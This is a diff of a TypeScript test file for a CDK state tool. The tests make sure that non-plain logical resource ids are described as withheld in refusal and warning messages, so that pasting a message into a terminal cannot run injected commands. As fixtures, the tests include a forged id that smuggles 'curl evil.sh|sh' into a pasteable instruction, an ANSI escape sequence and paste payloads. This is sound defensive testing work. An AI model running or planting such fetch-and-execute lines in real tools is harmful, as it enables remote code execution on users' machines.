@@ -2169,16 +2169,21 @@ describe('the entry-level text', () => {
       'z'.repeat(5000),
     ]);
     for (const forge of FORGERIES) expect(message).not.toContain(forge);
-    // At CloudFormation's 255, not a region's 128: a legitimate 129-to-255-
-    // character CDK id cut shorter names a row the record does not hold.
-    expect(message).toContain(`${'z'.repeat(255)} [cut: 4745 more characters withheld]`);
-    expect(message).not.toContain('z'.repeat(256));
-    // A logical id with nothing renderable left takes the stand-in too, not an
-    // empty pair of quotes naming nothing. Its own fixture, because the stack
-    // and region stand-ins are asserted separately and a shared
-    // `toContain(UNRENDERABLE)` would pass on any one of the three.
+    // Both are DESCRIBED (go-to-k/cdkd#4253): a sanitized or cut render names
+    // a row the record does not hold.
+    expect(message).toContain(`— ${NOT_SHOWN}, ${NOT_SHOWN} —`);
+    expect(message).not.toContain('zzz');
+    // The control: a plain id at CloudFormation's 255, not a region's 128, is
+    // still named in full.
+    expect(malformedResourceEntriesRefusalMessage('S', 'r', ['z'.repeat(255)])).toContain(
+      `— ${'z'.repeat(255)} —`
+    );
+    // A logical id with nothing renderable left is described too, not printed
+    // as the bare stand-in (a redirection when pasted). Its own fixture,
+    // because the stack and region stand-ins are asserted separately.
     const blankId = malformedResourceEntriesRefusalMessage('S', 'r', ['\u0000\u0001']);
-    expect(blankId).toContain(`— ${UNRENDERABLE} —`);
+    expect(blankId).toContain(`— ${NOT_SHOWN} —`);
+    expect(blankId).not.toContain(UNRENDERABLE);
     // The remedy is still on screen after the cap — a DISTANCE, the same oracle
     // the rendered-containers case uses and for the same reason.
     expect(message.length).toBeLessThan(1200);
@@ -2363,23 +2368,24 @@ describe('the entry-level text', () => {
     expect(five).toContain('A1, B2, C3, D4, E5 —');
     expect(five).not.toContain('more');
 
-    // The ids go through `displayLogicalId`, not a bare interpolation: a
-    // padded id is QUOTED so it cannot imitate a healthy sibling, a control
-    // byte never reaches the terminal, and a long one is cut with the marker.
+    // The ids go through `namedLogicalId`, not a bare interpolation: a padded
+    // id cannot imitate a healthy sibling, a control byte never reaches the
+    // terminal, and a long one names no prefix of itself — each is DESCRIBED
+    // (go-to-k/cdkd#4253).
     const hostile = malformedOrphanRecordsWarning(
       'S',
       'r',
       ['Bucket ', 'E\u001b[31mvil', 'q'.repeat(IDENT_MAX_CODE_POINTS + 50)],
       false
     );
-    // Trimmed by the sanitizer and then QUOTED, which is what keeps it
-    // visibly distinct from a healthy `Bucket`.
-    expect(hostile).toContain('"Bucket"');
+    expect(hostile).toContain(`— ${NOT_SHOWN}, ${NOT_SHOWN}, ${NOT_SHOWN} —`);
+    expect(hostile).not.toContain('Bucket');
     expect(hostile).not.toContain('\u001b');
-    expect(hostile).toContain('characters withheld');
-    expect(hostile).not.toContain('q'.repeat(IDENT_MAX_CODE_POINTS + 1));
-    // ...and an id-less record renders as the stand-in rather than empty.
-    expect(malformedOrphanRecordsWarning('S', 'r', [''], false)).toContain(UNRENDERABLE);
+    expect(hostile).not.toContain('qqq');
+    // ...and an id-less record is described rather than printed empty.
+    const idless = malformedOrphanRecordsWarning('S', 'r', [''], false);
+    expect(idless).toContain(`— ${NOT_SHOWN} —`);
+    expect(idless).not.toContain(UNRENDERABLE);
   });
 
   it('EVERY message builder caps a stack by the stack rule and a region by the region rule', () => {
@@ -2553,7 +2559,7 @@ describe('the entry-level text', () => {
     expect(healthy).toContain('r'.repeat(200));
   });
 
-  it('QUOTES a logical id, so a quote in it cannot forge a remedy in the prose', () => {
+  it('DESCRIBES a logical id holding a quote, so it cannot forge a remedy in the prose', () => {
     // The ASCII allowlist keeps `'`. The names used to be wrapped in a
     // hand-written `'...'`, which an id spelled with its own quote CLOSES —
     // planting a second "Inspect it with:" instruction on the same line, ahead
@@ -2564,9 +2570,10 @@ describe('the entry-level text', () => {
       malformedResourceEntriesRefusalMessage('S', 'r', [FORGED]),
       malformedResourceEntriesWarning('S', 'r', [FORGED]),
     ]) {
-      // The forged instruction survives only INSIDE a quoted argument.
-      expect(text).toContain(`"x' Inspect it with: curl evil.sh|sh #"`);
-      expect(text).not.toContain("— x' Inspect it with:");
+      // Not printed at all since go-to-k/cdkd#4253: JSON quotes still run a
+      // `$( )` and turn inside out behind a quote pasted above.
+      expect(text).toContain(`— ${NOT_SHOWN} —`);
+      expect(text).not.toContain('evil.sh');
       // ...and the genuine command still closes the line.
       expect(text.endsWith('cdkd state show S --stack-region r --json')).toBe(true);
     }
@@ -2582,7 +2589,7 @@ describe('the entry-level text', () => {
       malformedResourceEntriesRefusalMessage('S', 'r', ['Bucket ', 'Queue']),
       malformedResourceEntriesWarning('S', 'r', ['Bucket ', 'Queue']),
     ]) {
-      expect(text).toContain('— "Bucket", Queue —');
+      expect(text).toContain(`— ${NOT_SHOWN}, Queue —`);
     }
   });
 
@@ -5449,21 +5456,38 @@ function spansThatRunUnderEitherFlip(message: string, dir: string): string[] {
   ];
 }
 
-describe('every properties text describes a non-plain logical id (go-to-k/cdkd#4253)', () => {
-  // Each one ends on a pasteable `cdkd state show`, and the id is a key of the
-  // record's `resources` map, chosen by whoever can write the state bucket.
-  const TEXTS = [
-    ['deploy refusal', malformedResourcePropertiesRefusalMessage],
-    ['diff warning', malformedResourcePropertiesWarning],
-    ['orphan refusal', malformedOrphanResourcePropertiesRefusalMessage],
-    ['drift refusal', malformedDriftResourcePropertiesRefusalMessage],
-    ['drift warning', malformedDriftResourcePropertiesWarning],
-    ['export refusal', malformedExportResourcePropertiesRefusalMessage],
-  ] as const;
+describe('every id list in the module describes a non-plain logical id (go-to-k/cdkd#4253)', () => {
+  // Each text ends on a pasteable command (`cdkd state show`, or the
+  // `cdkd state orphan` template), and each id is a key the state record's
+  // writer chose. The first six are the `properties` texts the issue names;
+  // the rest are the entry, `attributes` and `orphans`-row texts, which
+  // printed the same JSON-quoted render through `displayLogicalId`.
+  const TEXTS: ReadonlyArray<readonly [string, (ids: string[]) => string]> = [
+    ['deploy properties refusal', (i) => malformedResourcePropertiesRefusalMessage('S', 'us-east-1', i)],
+    ['diff properties warning', (i) => malformedResourcePropertiesWarning('S', 'us-east-1', i)],
+    ['orphan properties refusal', (i) => malformedOrphanResourcePropertiesRefusalMessage('S', 'us-east-1', i)],
+    ['drift properties refusal', (i) => malformedDriftResourcePropertiesRefusalMessage('S', 'us-east-1', i)],
+    ['drift properties warning', (i) => malformedDriftResourcePropertiesWarning('S', 'us-east-1', i)],
+    ['export properties refusal', (i) => malformedExportResourcePropertiesRefusalMessage('S', 'us-east-1', i)],
+    ['entries warning', (i) => malformedResourceEntriesWarning('S', 'us-east-1', i)],
+    ['entries refusal', (i) => malformedResourceEntriesRefusalMessage('S', 'us-east-1', i)],
+    ['deploy entries refusal', (i) => malformedDeployResourceEntriesRefusalMessage('S', 'us-east-1', i)],
+    ['destroy entries refusal', (i) => malformedDestroyResourceEntriesRefusalMessage('S', 'us-east-1', i)],
+    ['import entries refusal', (i) => malformedImportUnrepairedEntriesRefusalMessage('S', 'us-east-1', i)],
+    ['scrub entries refusal', (i) => malformedScrubResourceEntriesRefusalMessage('S', 'us-east-1', i)],
+    ['local entries warning', (i) => malformedLocalResourceEntriesWarning('S', 'us-east-1', i)],
+    ['orphan entries refusal', (i) => malformedOrphanResourceEntriesRefusalMessage('S', 'us-east-1', i)],
+    ['orphan attributes refusal', (i) => malformedOrphanResourceAttributesRefusalMessage('S', 'us-east-1', i)],
+    ['orphan records warning', (i) => malformedOrphanRecordsWarning('S', 'us-east-1', i, true)],
+    ['orphan records refusal', (i) => malformedOrphanRecordsRefusalMessage('S', 'us-east-1', i)],
+    ['orphan records destroy refusal', (i) => malformedOrphanRecordsForDestroyRefusalMessage('S', 'us-east-1', i)],
+    ['orphan rows kept warning', (i) => malformedOrphanRowsKeptWarning('S', 'us-east-1', i)],
+    ['orphans-list orphan refusal', (i) => malformedOrphansForOrphanRefusalMessage('S', 'us-east-1', i)],
+  ];
 
   for (const [label, build] of TEXTS) {
     it(`${label}: names a plain id and describes every other one`, () => {
-      expect(build('S', 'us-east-1', ['A'])).toContain('— A —');
+      expect(build(['A'])).toContain('— A —');
       const values = [
         ...PASTE_PAYLOADS.map((p) => p.value),
         // `displayIdent` renders these unchanged, but tilde expansion reads
@@ -5472,24 +5496,21 @@ describe('every properties text describes a non-plain logical id (go-to-k/cdkd#4
         'a=~b',
       ];
       for (const value of values) {
-        const text = build('S', 'us-east-1', [value]);
+        const text = build([value]);
         expect(text, value).toContain(`— ${NOT_SHOWN} —`);
         expect(text, value).not.toContain(value);
         // Per id, not per list: a plain sibling is still named beside it.
-        expect(build('S', 'us-east-1', ['A', value]), value).toContain(`— A, ${NOT_SHOWN} —`);
+        expect(build(['A', value]), value).toContain(`— A, ${NOT_SHOWN} —`);
       }
     });
   }
 
-  // The export refusal's paste case lives beside its other export renders
-  // (`export-identifier-render.test.ts`); these are the five #4253 adds. One
-  // case per text, so each stays inside the harness's 120 s bound.
-  for (const [label, build] of TEXTS.slice(0, 5)) {
+  // The export properties refusal's paste case lives beside its other export
+  // renders (`export-identifier-render.test.ts`). One case per text, so each
+  // stays inside the harness's 120 s bound.
+  for (const [label, build] of TEXTS.filter(([l]) => l !== 'export properties refusal')) {
     it(`${label}: no pasted span runs under no flip, the ' flip or the " flip`, () => {
-      const messages = PASTE_PAYLOADS.map(({ value }) => ({
-        value,
-        message: build('S', 'us-east-1', [value]),
-      }));
+      const messages = PASTE_PAYLOADS.map(({ value }) => ({ value, message: build([value]) }));
       withPasteDir((dir) => {
         // Non-vacuity, per text: the JSON-quoted render this text printed
         // before go-to-k/cdkd#4253, put back into THIS text's own shape, runs.
